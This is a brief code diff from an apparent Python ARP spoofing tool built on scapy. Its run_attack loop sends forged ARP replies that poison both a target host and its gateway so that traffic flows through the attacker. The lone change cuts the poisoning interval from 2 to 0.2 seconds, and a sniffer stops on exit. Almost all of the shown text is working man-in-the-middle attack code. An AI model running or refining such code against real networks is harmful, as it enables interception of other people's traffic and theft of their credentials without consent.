@@ -433,7 +433,7 @@ def run_attack(mode, target, gateway, iface):
             sendp(Ether(dst=target_mac, src=my_mac)/ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway, hwsrc=my_mac), verbose=False, iface=iface)
             # 2. Говорим шлюзу (gateway), что мы — жертва
             sendp(Ether(dst=gateway_mac, src=my_mac)/ARP(op=2, pdst=gateway, hwdst=gateway_mac, psrc=target, hwsrc=my_mac), verbose=False, iface=iface)
-            time.sleep(2)
+            time.sleep(0.2)
     except KeyboardInterrupt:
         sniffer.stop()
         print(t('stop_msg'))
